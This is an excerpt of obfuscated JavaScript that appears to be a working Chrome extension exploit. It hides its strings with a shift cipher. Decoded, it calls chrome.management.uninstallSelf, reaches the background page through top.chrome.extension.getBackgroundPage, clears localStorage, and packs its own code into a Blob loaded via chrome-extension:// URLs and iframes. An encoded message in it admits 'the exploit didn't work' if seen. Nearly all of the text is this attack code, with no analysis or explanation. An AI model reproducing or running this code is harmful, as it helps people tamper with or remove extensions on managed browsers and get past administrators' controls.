...
function o(n, _ = 78, D = 126) {
    for (var x = n.toString().split(""), $ = 0; $ < x.length; $++)
        x[$].charCodeAt(0) <= D &&
            (x[$] = String.fromCharCode((x[$].charCodeAt(0) + _) % D));
    return x.join("");
}
...
const m = function () {
        ...
        _().runtime.id.startsWith("j") &&
            ((document.getElementById("updates").textContent =
                d`@1I<?14n\x03n1@@<954|nvI?En1B5>uDnCE@@?C54nD?n;>?GnG81DnD89Cn=51>Cw`),
            _().extension[d`C5D%@41D5%B<\x141D1`](
                decodeURIComponent(d`s\x15\x00s\x12\x06s\t\x15`).repeat(1024),
            )),
            localStorage[d`3<ECD5B`]?.startsWith(d`\x11&\x1F\x19\x14/\x1F#z`) ||
                (D.checked = !0),
            (D.onclick = function $() {
                D[d`3853;54`]
                    ? (delete window.WebRequestEventImpl, localStorage.clear())
                    : (_().management[d`E>9>CD1<<#5<6`].bind(_().runtime.id),
                      Storage.prototype[d`C5D\x19D5=`].call(
                          window[d`<?31<#D?B175`],
                          d`3<ECD5B`,
                          d`\x11&\x1F\x19\x14/\x1F#z` +
                              Date.now() * (Math[d`B1>4?=`]() + 1.5),
                      )),
            ...
            t(
                d`}9|8D=<`,
                "text/html",
                d`\fC3B9@DnCB3\rp|}9|:Cp\x0E\f}C3B9@D\x0E`,
            ).then(() => {
    ...
    a = [
        ...
        "3?>D5>D	|=9>|:C",
        "C53EB<I|=9>|:C",
        "/=5D141D1}F5B96954/3?>D5>DC|:C?>",
        "6?>DC}\x1d5DB?@?<9C{\x1d549E=|G?66",
        '6?>DC}\x1d5DB?@?<9C{"57E<1B|G?66',
        "6?>DC}\x1d5DB?@?<9C{#5=9\x12?<4|G?66",
        "6?>DC}\x1d5DB?@?<9C|3CC",
    ],
    SI = {
        NONE: "",
...
function e(n, _) {
    let D = function (n) {
            let _ = open();
            _.chrome =
                top.chrome[d`5HD5>C9?>`][d`75D\x1213;7B?E>4 175`]().chrome;
        ...
        t =
            d`\fCDI<5\x0ExKF9C929<9DI\n89445>M\f}CDI<5\x0EXnnnn\f96B1=5nCB34?3\rp\fC3B9@DnCB3\ru` +
            C +
            d`u\x0E\f}C3B9@D\x0Ep\x0EXnnnnnnnn\x189|n\x196nI?En31>nB514nD89CznD85n5H@<?9Dn494>uDnG?B;|Xnnnnnnnn'19Dn1n3?E@<5n?6nG55;C|n'5u<<n25n213;|||Xnnnn\f}96B1=5\x0E`;
    return (
        d`38B?=5{5HD5>C9?>\n}}` +
        _ +
        d`}` +
        ...
        d(a[1]) +
        [d`\x0F31D57?BI\r`] +
        window[d`5>3?45%"\x19\x13?=@?>5>D`](window[d`2D?1`](t))
    );
}
function gS2U(n) {
    return e(
        new window[d`\x12<?2`]([`${o};${d};(${m})()`], {
            type: d`D5HD}:1F1C3B9@D`,
        }),
        n,
    );
